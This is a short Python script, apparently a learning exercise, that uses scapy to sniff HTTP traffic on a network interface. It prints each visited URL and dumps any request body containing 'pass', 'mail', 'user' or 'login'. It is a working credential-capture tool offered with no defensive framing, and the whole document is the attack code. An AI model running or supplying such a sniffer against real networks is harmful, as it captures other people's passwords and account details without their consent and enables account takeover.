 #interceptar http
import scapy.all as scapy
from scapy.layers import http
def procces_packet(packet):
     keyword=["pass", "mail", "user", "login"]
 
     if packet.haslayer(http.HTTPRequest):
         url = f"http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
         print(f"url visitada: {url}")
         if packet.haslayer(scapy.Raw):
             try:
                 response =packet[scapy.Raw].load.decode()
 
                 for key in keyword:
                     if key in response:
                         print(response)
                 
             except:
                 pass
 
def sniff(inteface):
     scapy.sniff(iface= inteface, prn=procces_packet , store=0 )
 
def main():
     sniff("ens33")
 
if __name__ == '__main__':
     main()
 